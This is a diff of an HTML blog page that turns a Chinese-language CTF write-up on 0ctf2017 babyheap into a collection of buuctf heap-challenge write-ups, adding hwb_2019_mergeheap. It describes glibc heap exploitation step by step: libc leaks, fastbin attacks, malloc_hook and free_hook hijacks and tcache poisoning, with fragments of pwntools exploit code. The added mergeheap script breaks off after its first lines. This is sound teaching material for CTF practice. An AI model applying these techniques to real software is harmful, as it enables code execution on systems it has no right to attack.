@@ -7,34 +7,34 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="robots" content="noodp" />
-    <title>0ctf2017_babyheap - J4f&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="0ctf2017_babyheap" />
-<meta property="og:description" content="堆溢出" />
+    <title>buuctf中刷过的一些堆题 - J4f&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="buuctf中刷过的一些堆题" />
+<meta property="og:description" content="" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="http://ShlomoJune.github.io/posts/0ctf2017_babyheap/" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="http://ShlomoJune.github.io/posts/buuctf_heap/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2025-05-30T23:14:52+08:00" />
 <meta property="article:modified_time" content="2025-05-30T23:14:52+08:00" />
 
-<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="0ctf2017_babyheap"/>
-<meta name="twitter:description" content="堆溢出"/>
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="buuctf中刷过的一些堆题"/>
+<meta name="twitter:description" content=""/>
 <meta name="application-name" content="J4f&#39;s blog">
 <meta name="apple-mobile-web-app-title" content="J4f&#39;s blog">
 
 <meta name="theme-color" content="#f8f8f8"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://ShlomoJune.github.io/posts/0ctf2017_babyheap/" /><link rel="prev" href="http://ShlomoJune.github.io/posts/dvctf2025/" /><link rel="next" href="http://ShlomoJune.github.io/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/" />
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://ShlomoJune.github.io/posts/buuctf_heap/" /><link rel="prev" href="http://ShlomoJune.github.io/posts/dvctf2025/" /><link rel="next" href="http://ShlomoJune.github.io/posts/cyber_apocalypse_ctf_2025_tales_from_eldoria/" />
 <link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
         <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
         <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
-        "headline": "0ctf2017_babyheap",
+        "headline": "buuctf中刷过的一些堆题",
         "inLanguage": "en",
         "mainEntityOfPage": {
             "@type": "WebPage",
-            "@id": "http://ShlomoJune.github.io/posts/0ctf2017_babyheap/"
-        },"genre": "posts","wordcount":  1190 ,
-        "url": "http://ShlomoJune.github.io/posts/0ctf2017_babyheap/","datePublished": "2025-05-30T23:14:52+08:00","dateModified": "2025-05-30T23:14:52+08:00","publisher": {
+            "@id": "http://ShlomoJune.github.io/posts/buuctf_heap/"
+        },"genre": "posts","wordcount":  1561 ,
+        "url": "http://ShlomoJune.github.io/posts/buuctf_heap/","datePublished": "2025-05-30T23:14:52+08:00","dateModified": "2025-05-30T23:14:52+08:00","publisher": {
             "@type": "Organization",
             "name": "Author"},"author": {
                 "@type": "Person",
@@ -117,26 +117,27 @@
         <h2 class="toc-title">Contents</h2>
         <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
   <ul>
-    <li><a href="#逆向分析">逆向分析</a>
+    <li><a href="#0ctf2017_babyheap">0ctf2017_babyheap</a>
       <ul>
-        <li><a href="#初始化函数"><strong>初始化函数</strong></a></li>
-        <li><a href="#allocate函数"><strong>Allocate函数</strong></a></li>
-        <li><a href="#fill函数"><strong>Fill函数</strong></a></li>
-        <li><a href="#read_content函数"><strong>read_content函数：</strong></a></li>
-        <li><a href="#free函数"><strong>Free函数</strong></a></li>
-        <li><a href="#dump函数"><strong>Dump函数</strong></a></li>
+        <li><a href="#逆向分析"><strong>逆向分析</strong></a></li>
+        <li><a href="#pwn-it"><strong>pwn it</strong></a></li>
+        <li><a href="#exp">exp:</a></li>
       </ul>
     </li>
-    <li><a href="#pwn-it">pwn it</a></li>
-    <li><a href="#exp">exp:</a></li>
-    <li><a href="#参考文章">参考文章</a></li>
+    <li><a href="#buuctf_mergeheap">buuctf_mergeheap</a>
+      <ul>
+        <li><a href="#漏洞点"><strong>漏洞点</strong></a></li>
+        <li><a href="#思路"><strong>思路</strong></a></li>
+        <li><a href="#exp-1"><strong>exp</strong></a></li>
+      </ul>
+    </li>
   </ul>
 </nav></div>
-    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">0ctf2017_babyheap</h1><div class="post-meta">
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">buuctf中刷过的一些堆题</h1><div class="post-meta">
             <div class="post-meta-line">
                 <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Author</a>
                 </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">category <a href="/categories/pwn/"><i class="far fa-folder fa-fw"></i>pwn</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2025-05-30">2025-05-30</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2025-05-30">2025-05-30</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1190 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;6 minutes&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2025-05-30">2025-05-30</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2025-05-30">2025-05-30</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1561 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;8 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
                     <span>Contents</span>
@@ -144,25 +145,34 @@
                 </div>
                 <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li><a href="#逆向分析">逆向分析</a>
+    <li><a href="#0ctf2017_babyheap">0ctf2017_babyheap</a>
       <ul>
-        <li><a href="#初始化函数"><strong>初始化函数</strong></a></li>
-        <li><a href="#allocate函数"><strong>Allocate函数</strong></a></li>
-        <li><a href="#fill函数"><strong>Fill函数</strong></a></li>
-        <li><a href="#read_content函数"><strong>read_content函数：</strong></a></li>
-        <li><a href="#free函数"><strong>Free函数</strong></a></li>
-        <li><a href="#dump函数"><strong>Dump函数</strong></a></li>
+        <li><a href="#逆向分析"><strong>逆向分析</strong></a></li>
+        <li><a href="#pwn-it"><strong>pwn it</strong></a></li>
+        <li><a href="#exp">exp:</a></li>
       </ul>
     </li>
-    <li><a href="#pwn-it">pwn it</a></li>
-    <li><a href="#exp">exp:</a></li>
-    <li><a href="#参考文章">参考文章</a></li>
+    <li><a href="#buuctf_mergeheap">buuctf_mergeheap</a>
+      <ul>
+        <li><a href="#漏洞点"><strong>漏洞点</strong></a></li>
+        <li><a href="#思路"><strong>思路</strong></a></li>
+        <li><a href="#exp-1"><strong>exp</strong></a></li>
+      </ul>
+    </li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><p>堆溢出</p>
-<p>2.23的堆，保护全开</p>
-<h2 id="逆向分析" class="headerLink">
-    <a href="#%e9%80%86%e5%90%91%e5%88%86%e6%9e%90" class="header-mark"></a>逆向分析</h2><div class="highlight"><div class="chroma">
+            </div><div class="content" id="content"><div class="details admonition notion open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-pencil-alt fa-fw"></i>Tip<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">一些在buu刷过的heap题，不想放在笔记里，就放这里了</div>
+        </div>
+    </div>
+<h2 id="0ctf2017_babyheap" class="headerLink">
+    <a href="#0ctf2017_babyheap" class="header-mark"></a>0ctf2017_babyheap</h2><p>2.23的堆，保护全开</p>
+<h3 id="逆向分析" class="headerLink">
+    <a href="#%e9%80%86%e5%90%91%e5%88%86%e6%9e%90" class="header-mark"></a><strong>逆向分析</strong></h3><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -226,8 +236,8 @@
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="初始化函数" class="headerLink">
-    <a href="#%e5%88%9d%e5%a7%8b%e5%8c%96%e5%87%bd%e6%95%b0" class="header-mark"></a><strong>初始化函数</strong></h3><div class="highlight"><div class="chroma">
+</div><p><strong>初始化函数</strong></p>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -298,8 +308,8 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>read_num函数没什么好说的</p>
-<h3 id="allocate函数" class="headerLink">
-    <a href="#allocate%e5%87%bd%e6%95%b0" class="header-mark"></a><strong>Allocate函数</strong></h3><p>分配一个baby，inuse位置1，分配我们填入的size大小的堆块，并把size填入baby-&gt;size，堆块的指针写入baby-&gt;content</p>
+<p><strong>Allocate函数</strong></p>
+<p>分配一个baby，inuse位置1，分配我们填入的size大小的堆块，并把size填入baby-&gt;size，堆块的指针写入baby-&gt;content</p>
 <p>从baby0开始，根据Inuse位，有空插空，分配baby。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -363,8 +373,8 @@
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="fill函数" class="headerLink">
-    <a href="#fill%e5%87%bd%e6%95%b0" class="header-mark"></a><strong>Fill函数</strong></h3><p>选择一个正在使用的baby，往它的content里读入大小为size的内容，这个size我们可以控制</p>
+</div><p><strong>Fill函数</strong></p>
+<p>选择一个正在使用的baby，往它的content里读入大小为size的内容，这个size我们可以控制</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -426,8 +436,8 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>填充content，但是size是多少就往content里读入多少，存在溢出</p>
-<h3 id="read_content函数" class="headerLink">
-    <a href="#read_content%e5%87%bd%e6%95%b0" class="header-mark"></a><strong>read_content函数：</strong></h3><div class="highlight"><div class="chroma">
+<p><strong>read_content函数：</strong></p>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -477,8 +487,8 @@
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="free函数" class="headerLink">
-    <a href="#free%e5%87%bd%e6%95%b0" class="header-mark"></a><strong>Free函数</strong></h3><p>选择一个正在使用的baby，把inuse，size位置0，free掉content，并把指针置0</p>
+</div><p><strong>Free函数</strong></p>
+<p>选择一个正在使用的baby，把inuse，size位置0，free掉content，并把指针置0</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -529,8 +539,8 @@
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="dump函数" class="headerLink">
-    <a href="#dump%e5%87%bd%e6%95%b0" class="header-mark"></a><strong>Dump函数</strong></h3><p>选择一个正在使用的baby，根据这个baby的size，打印出size大小的content</p>
+</div><p><strong>Dump函数</strong></p>
+<p>选择一个正在使用的baby，根据这个baby的size，打印出size大小的content</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -577,9 +587,9 @@
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="pwn-it" class="headerLink">
-    <a href="#pwn-it" class="header-mark"></a>pwn it</h2><p><strong>总体思路是覆盖malloc_hook为one_gadget</strong></p>
-<p><strong>首先需要泄露libc基地址</strong></p>
+</div><h3 id="pwn-it" class="headerLink">
+    <a href="#pwn-it" class="header-mark"></a><strong>pwn it</strong></h3><p>总体思路是覆盖malloc_hook为one_gadget</p>
+<p>首先需要泄露libc基地址</p>
 <p>可以malloc一个small bin，然后free掉它，会进入unsorted bin，其fd和bk会指向main_arena+88，main_arena+88在libc中，可以计算偏移求出基地址。</p>
 <p>但是free掉的baby，它的content指针会置空，inuse位置0，不能dump出来，所以我们需要另一个baby的content指针指向这个unsorted bin，之后dump这个新的baby</p>
 <p>首先申请4个fastbin大小（0x20&ndash;0x80大小）的堆块，再free掉baby2、baby1</p>
@@ -605,13 +615,14 @@
 </span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><figure><img
-        
-        loading="lazy"
-        src="/img/0ctf2017_babyheap/0ctf-babyheap1.png"
-        srcset="/img/0ctf2017_babyheap/0ctf-babyheap1.png, /img/0ctf2017_babyheap/0ctf-babyheap1.png 1.5x, /img/0ctf2017_babyheap/0ctf-babyheap1.png 2x"
-        alt="/img/0ctf2017_babyheap/0ctf-babyheap1.png"
-        title="/img/0ctf2017_babyheap/0ctf-babyheap1.png" ></figure></p>
+</div><a class="lightgallery" href="/img/0ctf2017_babyheap/0ctf-babyheap1.png" title="图片显示错误" data-thumbnail="/img/0ctf2017_babyheap/0ctf-babyheap1.png">
+        <img
+            
+            loading="lazy"
+            src="/img/0ctf2017_babyheap/0ctf-babyheap1.png"
+            srcset="/img/0ctf2017_babyheap/0ctf-babyheap1.png, /img/0ctf2017_babyheap/0ctf-babyheap1.png 1.5x, /img/0ctf2017_babyheap/0ctf-babyheap1.png 2x"
+            alt="图片显示错误" width="2000px" >
+    </a>
 <p>再利用堆溢出，改babychunk2的fd的末尾字节为0x80，这样就指向了babychunk4</p>
 <p>同时把babychunk4的size改为0x20</p>
 <div class="highlight"><div class="chroma">
@@ -628,13 +639,14 @@
 </span></span><span class="line"><span class="cl"><span class="n">fill</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">pl</span><span class="p">),</span><span class="n">pl</span><span class="p">)</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><figure><img
-        
-        loading="lazy"
-        src="/img/0ctf2017_babyheap/0ctf-babyheap2.png"
-        srcset="/img/0ctf2017_babyheap/0ctf-babyheap2.png, /img/0ctf2017_babyheap/0ctf-babyheap2.png 1.5x, /img/0ctf2017_babyheap/0ctf-babyheap2.png 2x"
-        alt="/img/0ctf2017_babyheap/0ctf-babyheap2.png"
-        title="/img/0ctf2017_babyheap/0ctf-babyheap2.png" ></figure></p>
+</div><a class="lightgallery" href="/img/0ctf2017_babyheap/0ctf-babyheap2.png" title="/img/0ctf2017_babyheap/0ctf-babyheap2.png" data-thumbnail="/img/0ctf2017_babyheap/0ctf-babyheap2.png">
+        <img
+            
+            loading="lazy"
+            src="/img/0ctf2017_babyheap/0ctf-babyheap2.png"
+            srcset="/img/0ctf2017_babyheap/0ctf-babyheap2.png, /img/0ctf2017_babyheap/0ctf-babyheap2.png 1.5x, /img/0ctf2017_babyheap/0ctf-babyheap2.png 2x"
+            alt="/img/0ctf2017_babyheap/0ctf-babyheap2.png" width="900px" >
+    </a>
 <p>再把申请两个大小为0x20的chunk，第二个chunk指向的是baby4（那个small bin）</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -710,22 +722,24 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>注意，我们之前让baby2 -&gt; babychunk4，可以通过fill(2)来设置babychunk4的fd，它的fd要设置在哪个具体位置？</p>
-<p><figure><img
-        
-        loading="lazy"
-        src="/img/0ctf2017_babyheap/0ctf-babyheap4.png"
-        srcset="/img/0ctf2017_babyheap/0ctf-babyheap4.png, /img/0ctf2017_babyheap/0ctf-babyheap4.png 1.5x, /img/0ctf2017_babyheap/0ctf-babyheap4.png 2x"
-        alt="/img/0ctf2017_babyheap/0ctf-babyheap4.png"
-        title="/img/0ctf2017_babyheap/0ctf-babyheap4.png" ></figure></p>
+<a class="lightgallery" href="/img/0ctf2017_babyheap/0ctf-babyheap4.png" title="图片显示错误" data-thumbnail="/img/0ctf2017_babyheap/0ctf-babyheap4.png">
+        <img
+            
+            loading="lazy"
+            src="/img/0ctf2017_babyheap/0ctf-babyheap4.png"
+            srcset="/img/0ctf2017_babyheap/0ctf-babyheap4.png, /img/0ctf2017_babyheap/0ctf-babyheap4.png 1.5x, /img/0ctf2017_babyheap/0ctf-babyheap4.png 2x"
+            alt="图片显示错误" width="800px" >
+    </a>
 <p>malloc_hook附近有很多地址，可以让申请的arbitary chunk的size为0x7f</p>
 <p>把堆块申请成这样：</p>
-<p><figure><img
-        
-        loading="lazy"
-        src="/img/0ctf2017_babyheap/0ctf-babyheap3.png"
-        srcset="/img/0ctf2017_babyheap/0ctf-babyheap3.png, /img/0ctf2017_babyheap/0ctf-babyheap3.png 1.5x, /img/0ctf2017_babyheap/0ctf-babyheap3.png 2x"
-        alt="/img/0ctf2017_babyheap/0ctf-babyheap3.png"
-        title="/img/0ctf2017_babyheap/0ctf-babyheap3.png" ></figure></p>
+<a class="lightgallery" href="/img/0ctf2017_babyheap/0ctf-babyheap3.png" title="图片显示错误" data-thumbnail="/img/0ctf2017_babyheap/0ctf-babyheap3.png">
+        <img
+            
+            loading="lazy"
+            src="/img/0ctf2017_babyheap/0ctf-babyheap3.png"
+            srcset="/img/0ctf2017_babyheap/0ctf-babyheap3.png, /img/0ctf2017_babyheap/0ctf-babyheap3.png 1.5x, /img/0ctf2017_babyheap/0ctf-babyheap3.png 2x"
+            alt="图片显示错误" height="800px"  width="800px" >
+    </a>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -739,13 +753,14 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>此时的bins:</p>
-<p><figure><img
-        
-        loading="lazy"
-        src="/img/0ctf2017_babyheap/0ctf-babyheap5.png"
-        srcset="/img/0ctf2017_babyheap/0ctf-babyheap5.png, /img/0ctf2017_babyheap/0ctf-babyheap5.png 1.5x, /img/0ctf2017_babyheap/0ctf-babyheap5.png 2x"
-        alt="/img/0ctf2017_babyheap/0ctf-babyheap5.png"
-        title="/img/0ctf2017_babyheap/0ctf-babyheap5.png" ></figure></p>
+<a class="lightgallery" href="/img/0ctf2017_babyheap/0ctf-babyheap5.png" title="图片显示错误" data-thumbnail="/img/0ctf2017_babyheap/0ctf-babyheap5.png">
+        <img
+            
+            loading="lazy"
+            src="/img/0ctf2017_babyheap/0ctf-babyheap5.png"
+            srcset="/img/0ctf2017_babyheap/0ctf-babyheap5.png, /img/0ctf2017_babyheap/0ctf-babyheap5.png 1.5x, /img/0ctf2017_babyheap/0ctf-babyheap5.png 2x"
+            alt="图片显示错误" height="800px"  width="800px" >
+    </a>
 <p>接着申请两个大小为0x70的chunk，第二个chunk（babychunk6）就是申请到了malloc_hook附近</p>
 <p>再计算偏移，往malloc_hook填入one_gadget</p>
 <p>再去malloc一次，就能到one_gadget了</p>
@@ -769,8 +784,8 @@
 </span></span><span class="line"><span class="cl">allocate(0x100)
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="exp" class="headerLink">
-    <a href="#exp" class="header-mark"></a>exp:</h2><div class="highlight"><div class="chroma">
+</div><h3 id="exp" class="headerLink">
+    <a href="#exp" class="header-mark"></a>exp:</h3><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -952,8 +967,297 @@
 </span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="参考文章" class="headerLink">
-    <a href="#%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0" class="header-mark"></a>参考文章</h2><p><a href="https://bbs.kanxue.com/thread-268200.htm" target="_blank" rel="noopener noreferrer">https://bbs.kanxue.com/thread-268200.htm</a></p></div>
+</div><p><strong>参考文章</strong></p>
+<p><a href="https://bbs.kanxue.com/thread-268200.htm" target="_blank" rel="noopener noreferrer">https://bbs.kanxue.com/thread-268200.htm</a></p>
+<h2 id="buuctf_mergeheap" class="headerLink">
+    <a href="#buuctf_mergeheap" class="header-mark"></a>buuctf_mergeheap</h2><blockquote>
+<p>off-by-one + tcache poisoning</p>
+</blockquote>
+<ul>
+<li>add：根据输入的大小size申请堆，可以往堆里写入size大小的数据，并把堆地址写入Chunk_array，size写进chunk_size数组（size的大小为4个字节）</li>
+<li>show：根据输入的idx，puts出堆块的内容</li>
+<li>dele：根据输入的idx，free掉相应堆块，并把指针置空。chunk_size置空</li>
+<li>merge：根据输入的idx1,idx2，把两个堆块合并起来，size加起来写入chunk_size数组，chunk_array同理。内容也合并</li>
+<li>exit:退出</li>
+</ul>
+<h3 id="漏洞点" class="headerLink">
+    <a href="#%e6%bc%8f%e6%b4%9e%e7%82%b9" class="header-mark"></a><strong>漏洞点</strong></h3><p>在merge_heap的时候，用的是strcat，strcpy</p>
+<blockquote>
+<h4 id="strcpy" class="headerLink">
+    <a href="#strcpy" class="header-mark"></a>strcpy</h4><p>字符串复制</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="nf">strcpy</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">dest</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>行为：</strong></p>
+<ul>
+<li><strong>复制src到dest</strong>，包括NULL终止符</li>
+<li>不检查缓冲区大小</li>
+</ul>
+<h4 id="strcat" class="headerLink">
+    <a href="#strcat" class="header-mark"></a>strcat</h4><p>字符串拼接</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="nf">strcat</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">dest</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>行为：</strong></p>
+<ul>
+<li>将src追加到dest末尾</li>
+<li>依赖dest的NULL终止符找到结尾</li>
+</ul>
+</blockquote>
+<p>存在off-by-one</p>
+<a class="lightgallery" href="/img/buuctf_heap/mergeheap/1.png" title="图片显示错误" data-thumbnail="/img/buuctf_heap/mergeheap/1.png">
+        <img
+            
+            loading="lazy"
+            src="/img/buuctf_heap/mergeheap/1.png"
+            srcset="/img/buuctf_heap/mergeheap/1.png, /img/buuctf_heap/mergeheap/1.png 1.5x, /img/buuctf_heap/mergeheap/1.png 2x"
+            alt="图片显示错误" height="800px"  width="800px" >
+    </a>
+<p>当我们将idx1和2进行合并的时候，idx2的size域0x21会被strcpy看作src的一部分，从而会导致idx2的最后一个字节off-by-two（还有一个strcat的NULL终止符）</p>
+<a class="lightgallery" href="/img/buuctf_heap/mergeheap/2.png" title="图片显示错误" data-thumbnail="/img/buuctf_heap/mergeheap/2.png">
+        <img
+            
+            loading="lazy"
+            src="/img/buuctf_heap/mergeheap/2.png"
+            srcset="/img/buuctf_heap/mergeheap/2.png, /img/buuctf_heap/mergeheap/2.png 1.5x, /img/buuctf_heap/mergeheap/2.png 2x"
+            alt="图片显示错误" height="800px"  width="800px" >
+    </a>
+<h3 id="思路" class="headerLink">
+    <a href="#%e6%80%9d%e8%b7%af" class="header-mark"></a><strong>思路</strong></h3><ul>
+<li>填满tcache bin</li>
+<li>泄露libc，通过off-by-one去改大下一个堆块的size，free掉，进入unsorted bin，通过chunk overlapping</li>
+<li>通过tcache poisoning，分配堆块到free_hook，劫持为system，再free掉内容为binsh的堆块</li>
+</ul>
+<h3 id="exp-1" class="headerLink">
+    <a href="#exp-1" class="header-mark"></a><strong>exp</strong></h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#hwb_2019_mergeheap</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">]</span>
